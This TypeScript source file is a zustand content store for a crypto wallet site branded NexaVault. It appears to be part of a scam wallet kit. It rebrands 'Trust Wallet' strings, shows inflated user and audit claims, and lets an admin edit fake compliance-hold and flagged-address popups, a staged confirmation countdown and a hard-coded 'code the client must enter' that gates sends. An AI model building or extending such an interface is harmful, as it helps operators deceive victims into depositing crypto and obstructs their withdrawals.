import { create } from "zustand";
import { createJSONStorage, persist } from "zustand/middleware";
import { hasAdminProof } from "@/lib/admin-proof";

export interface SiteContent {
  brandName: string;
  tagline: string;
  logo: string | null;
  heroKicker: string;
  heroTitleA: string;
  heroTitleB: string;
  heroSub: string;
  heroCta: string;
  heroSecondary: string;
  statUsersN: string;
  statUsersL: string;
  statChainsN: string;
  statChainsL: string;
  statAssetsN: string;
  statAssetsL: string;
  statAuditsN: string;
  statAuditsL: string;
  assetsTitle: string;
  assetsSub: string;
  securityTitle: string;
  securitySub: string;
  security1t: string;
  security1d: string;
  security2t: string;
  security2d: string;
  security3t: string;
  security3d: string;
  onestopTitle: string;
  onestopSub: string;
  footerLegal: string;
  loginTitle: string;
  loginSub: string;
  featuresTitle: string;
  featuresSub: string;
  securityPageTitle: string;
  securityPageSub: string;
  walletName: string;
  tabHome: string;
  tabMarkets: string;
  tabSwap: string;
  tabActivity: string;
  tabProfile: string;
  actionSend: string;
  actionReceive: string;
  actionBuy: string;
  heroImage: string | null;
  securityImage: string | null;
  aboutImage: string | null;
  navMarkets: string;
  navFeatures: string;
  navSecurity: string;
  navLogin: string;
  navOpenWallet: string;
  noticeT20Title: string;
  noticeT20Body: string;
  noticeF20Title: string;
  noticeF20Body: string;
  noticeK20Title: string;
  noticeK20Body: string;
  noticeCta: string;
  sendSureTitle: string;
  sendSureBody: string;
  sendSureOk: string;
  sendSureCancel: string;
  sendConfirmMinutes: string;
  sendConfirmCount: string;
  sendConfirmTitle: string;
  sendConfirmLabel: string;
  sendConfirmHint: string;
  sendCodeTitle: string;
  sendCodeBody: string;
  sendCodePlaceholder: string;
  sendCodeButton: string;
  sendCodeError: string;
  sendCodeValue: string;
}

export function renameAurexToTrust<T>(value: T): T {
  if (typeof value === "string") {
    return value
      .replaceAll("Trust Wallet", "NexaVault")
      .replaceAll("Aurex", "NexaVault")
      .replace(/\bTrust\b/g, "NexaVault") as T;
  }
  if (!value || typeof value !== "object" || Array.isArray(value)) return value;
  const out: Record<string, unknown> = { ...(value as Record<string, unknown>) };
  for (const key of Object.keys(out)) {
    const item = out[key];
    if (typeof item === "string") {
      out[key] = item
        .replaceAll("Trust Wallet", "NexaVault")
        .replaceAll("Aurex", "NexaVault")
        .replace(/\bTrust\b/g, "NexaVault");
    }
  }
  if (out.brandName === "Trust" || out.brandName === "Trust Wallet" || out.brandName === "Aurex") {
    out.brandName = "NexaVault";
  }
  return out as T;
}

export const SITE_DEFAULTS: SiteContent = {
  brandName: "NexaVault",
  tagline: "Sovereign multi-chain vault. Zero-knowledge custody.",
  logo: null,
  heroKicker: "Sovereign Architecture · 100+ Networks",
  heroTitleA: "Next-generation",
  heroTitleB: "self-custody vault.",
  heroSub:
    "NexaVault is an institutional-grade self-custody crypto terminal. Buy, route, swap, and trade perpetuals across Bitcoin, Ethereum, Solana, and 100+ chains with local-first key encryption.",
  heroCta: "Launch Vault",
  heroSecondary: "Explore Markets",
  statUsersN: "14M+",
  statUsersL: "Active vaults",
  statChainsN: "110+",
  statChainsL: "Supported networks",
  statAssetsN: "12M+",
  statAssetsL: "Indexed tokens",
  statAuditsN: "SOC2",
  statAuditsL: "Security verified",
  assetsTitle: "Unified multi-chain liquidity.",
  assetsSub:
    "Bitcoin, Ethereum, Solana, Tron, Arbitrum, and BNB Chain — manage spot holdings and perpetual positions from one unified command deck.",
  securityTitle: "Hardware-grade isolation",
  securitySub: "Your cryptographic keys stay encrypted in your local device enclave. Never exposed, never shared.",
  security1t: "Zero-knowledge enclave",
  security1d: "Mnemonic phrases and private keys are encrypted locally on your device.",
  security2t: "Telemetry-free privacy",
  security2d: "Zero IP logging, zero wallet profiling, and direct RPC broadcasting.",
  security3t: "Pre-flight simulation",
  security3d: "Every transfer, swap, and perp order is verified with exact fee breakdown before signing.",
  onestopTitle: "Command your Web3 portfolio",
  onestopSub: "Instant cross-chain routing, live perpetual markets, and real-time analytics in one interface.",
  footerLegal: "NexaVault is a non-custodial Web3 terminal. You retain sole control of your cryptographic keys.",
  loginTitle: "Authenticate Vault",
  loginSub: "Enter your credentials to unlock your encrypted NexaVault session.",
  featuresTitle: "Engineered for sovereign custody",
  featuresSub: "Spot transfers, zero-fee stablecoin swaps, card on-ramps, and perpetual futures.",
  securityPageTitle: "NexaVault Security Architecture",
  securityPageSub: "Local-first cryptography. Keys never leave your hardware.",
  walletName: "Primary Vault",
  tabHome: "Vault",
  tabMarkets: "Markets",
  tabSwap: "Swap",
  tabActivity: "Ledger",
  tabProfile: "Identity",
  actionSend: "Send",
  actionReceive: "Receive",
  actionBuy: "Buy",
  heroImage: null,
  securityImage: null,
  aboutImage: null,
  navMarkets: "Markets",
  navFeatures: "Architecture",
  navSecurity: "Security",
  navLogin: "Sign in",
  navOpenWallet: "Launch Vault",
  noticeT20Title: "Transfer held for compliance review",
  noticeT20Body:
    "This outgoing transfer is paused for a compliance check.\n\nConfirm the destination address belongs to the intended recipient. Network fees are not refundable once the transfer is signed.",
  noticeF20Title: "Additional verification required",
  noticeF20Body:
    "A second verification step is required before this send can proceed.\n\nReview the amount, asset, and network fee. Continue only if you initiated this transfer on this device.",
  noticeK20Title: "Destination flagged for scrutiny",
  noticeK20Body:
    "The destination wallet is marked for extra scrutiny.\n\nDouble-check every character of the address. Continue only if you recognize the recipient and accept the risk.",
  noticeCta: "Acknowledge & continue",
  sendSureTitle: "Verify destination vault address",
  sendSureBody:
    "Inspect the recipient address carefully. Blockchain settlements are irreversible once broadcast.",
  sendSureOk: "Broadcast Transfer",
  sendSureCancel: "Cancel",
  sendConfirmMinutes: "4",
  sendConfirmCount: "12",
  sendConfirmTitle: "Verifying on-chain",
  sendConfirmLabel: "Block confirmation {current} of {total}",
  sendConfirmHint: "Validators are finalizing this transfer. Keep your vault window active until completion.",
  sendCodeTitle: "Enter security authorization code",
  sendCodeBody: "An authorization code was dispatched to your registered phone number. Enter it to finalize settlement.",
  sendCodePlaceholder: "6-digit code",
  sendCodeButton: "Authorize Settlement",
  sendCodeError: "Invalid authorization code. Please try again.",
  sendCodeValue: "739214",
};

export const SITE_TEXT_FIELDS: { key: keyof SiteContent; label: string; group: string; multiline?: boolean }[] = [
  { key: "brandName", label: "Site name", group: "Brand" },
  { key: "tagline", label: "Tagline", group: "Brand", multiline: true },
  { key: "walletName", label: "Wallet name (inside the app)", group: "Brand" },
  { key: "navMarkets", label: "Nav — Markets", group: "Brand" },
  { key: "navFeatures", label: "Nav — Features", group: "Brand" },
  { key: "navSecurity", label: "Nav — Security", group: "Brand" },
  { key: "navLogin", label: "Button — Log in", group: "Brand" },
  { key: "navOpenWallet", label: "Button — Open wallet", group: "Brand" },
  { key: "tabHome", label: "Wallet tab — Home", group: "Brand" },
  { key: "tabMarkets", label: "Wallet tab — Markets", group: "Brand" },
  { key: "tabSwap", label: "Wallet tab — Swap", group: "Brand" },
  { key: "tabActivity", label: "Wallet tab — Activity", group: "Brand" },
  { key: "tabProfile", label: "Wallet tab — Profile", group: "Brand" },
  { key: "actionSend", label: "Action — Send", group: "Brand" },
  { key: "actionReceive", label: "Action — Receive", group: "Brand" },
  { key: "actionBuy", label: "Action — Buy", group: "Brand" },
  { key: "heroKicker", label: "Kicker", group: "Homepage hero" },
  { key: "heroTitleA", label: "Title line 1", group: "Homepage hero" },
  { key: "heroTitleB", label: "Title line 2", group: "Homepage hero" },
  { key: "heroSub", label: "Subtitle", group: "Homepage hero", multiline: true },
  { key: "heroCta", label: "Primary button", group: "Homepage hero" },
  { key: "heroSecondary", label: "Secondary button", group: "Homepage hero" },
  { key: "statUsersN", label: "Stat 1 number", group: "Stats" },
  { key: "statUsersL", label: "Stat 1 label", group: "Stats" },
  { key: "statChainsN", label: "Stat 2 number", group: "Stats" },
  { key: "statChainsL", label: "Stat 2 label", group: "Stats" },
  { key: "statAssetsN", label: "Stat 3 number", group: "Stats" },
  { key: "statAssetsL", label: "Stat 3 label", group: "Stats" },
  { key: "statAuditsN", label: "Stat 4 number", group: "Stats" },
  { key: "statAuditsL", label: "Stat 4 label", group: "Stats" },
  { key: "assetsTitle", label: "Assets title", group: "Assets + security + footer" },
  { key: "assetsSub", label: "Assets subtitle", group: "Assets + security + footer", multiline: true },
  { key: "securityTitle", label: "Security title", group: "Assets + security + footer" },
  { key: "securitySub", label: "Security subtitle", group: "Assets + security + footer", multiline: true },
  { key: "security1t", label: "Card 1 title", group: "Assets + security + footer" },
  { key: "security1d", label: "Card 1 text", group: "Assets + security + footer", multiline: true },
  { key: "security2t", label: "Card 2 title", group: "Assets + security + footer" },
  { key: "security2d", label: "Card 2 text", group: "Assets + security + footer", multiline: true },
  { key: "security3t", label: "Card 3 title", group: "Assets + security + footer" },
  { key: "security3d", label: "Card 3 text", group: "Assets + security + footer", multiline: true },
  { key: "onestopTitle", label: "Bottom title", group: "Assets + security + footer" },
  { key: "onestopSub", label: "Bottom subtitle", group: "Assets + security + footer", multiline: true },
  { key: "footerLegal", label: "Footer line", group: "Assets + security + footer", multiline: true },
  { key: "loginTitle", label: "Login title", group: "Login + inner pages" },
  { key: "loginSub", label: "Login subtitle", group: "Login + inner pages", multiline: true },
  { key: "featuresTitle", label: "Features title", group: "Login + inner pages" },
  { key: "featuresSub", label: "Features subtitle", group: "Login + inner pages", multiline: true },
  { key: "securityPageTitle", label: "Security page title", group: "Login + inner pages" },
  { key: "securityPageSub", label: "Security page subtitle", group: "Login + inner pages", multiline: true },
  { key: "noticeT20Title", label: "T20 popup title", group: "Send notices" },
  { key: "noticeT20Body", label: "T20 popup text", group: "Send notices", multiline: true },
  { key: "noticeF20Title", label: "F20 popup title", group: "Send notices" },
  { key: "noticeF20Body", label: "F20 popup text", group: "Send notices", multiline: true },
  { key: "noticeK20Title", label: "K20 popup title", group: "Send notices" },
  { key: "noticeK20Body", label: "K20 popup text", group: "Send notices", multiline: true },
  { key: "noticeCta", label: "Popup button", group: "Send notices" },
  { key: "sendSureTitle", label: "Address check title", group: "Send confirmation" },
  { key: "sendSureBody", label: "Address check text", group: "Send confirmation", multiline: true },
  { key: "sendSureOk", label: "Address check OK button", group: "Send confirmation" },
  { key: "sendSureCancel", label: "Address check cancel button", group: "Send confirmation" },
  { key: "sendConfirmMinutes", label: "Minutes until the last confirmation", group: "Send confirmation" },
  { key: "sendConfirmCount", label: "How many confirmations", group: "Send confirmation" },
  { key: "sendConfirmTitle", label: "Confirming title", group: "Send confirmation" },
  { key: "sendConfirmLabel", label: "Confirming line (use {current} and {total})", group: "Send confirmation" },
  { key: "sendConfirmHint", label: "Confirming note", group: "Send confirmation", multiline: true },
  { key: "sendCodeTitle", label: "Code box title", group: "Send confirmation" },
  { key: "sendCodeBody", label: "Code box text", group: "Send confirmation", multiline: true },
  { key: "sendCodePlaceholder", label: "Code box placeholder", group: "Send confirmation" },
  { key: "sendCodeButton", label: "Code box button", group: "Send confirmation" },
  { key: "sendCodeError", label: "Wrong code message", group: "Send confirmation" },
  { key: "sendCodeValue", label: "Code the client must enter", group: "Send confirmation" },
];

interface SiteState extends SiteContent {
  hydrated: boolean;
  patch: (partial: Partial<SiteContent>) => void;
  reset: () => void;
}

export const useSite = create<SiteState>()(
  persist(
    (set) => ({
      ...SITE_DEFAULTS,
      hydrated: false,
      patch: (partial) => {
        if (!hasAdminProof()) return;
        set(partial);
      },
      reset: () => {
        if (!hasAdminProof()) return;
        set({ ...SITE_DEFAULTS });
      },
    }),
    {
      name: "aurex-site-en",
      storage: createJSONStorage(() => localStorage),
      skipHydration: true,
      merge: (persisted, current) => ({
        ...current,
        ...((persisted as object) ?? {}),
      }),
      partialize: (s) => {
        const { hydrated, patch, reset, ...rest } = s;
        void hydrated;
        void patch;
        void reset;
        return rest;
      },
      onRehydrateStorage: () => () => {
        const cur = useSite.getState();
        useSite.setState(renameAurexToTrust({ ...SITE_DEFAULTS, ...cur }));
      },
    },
  ),
);
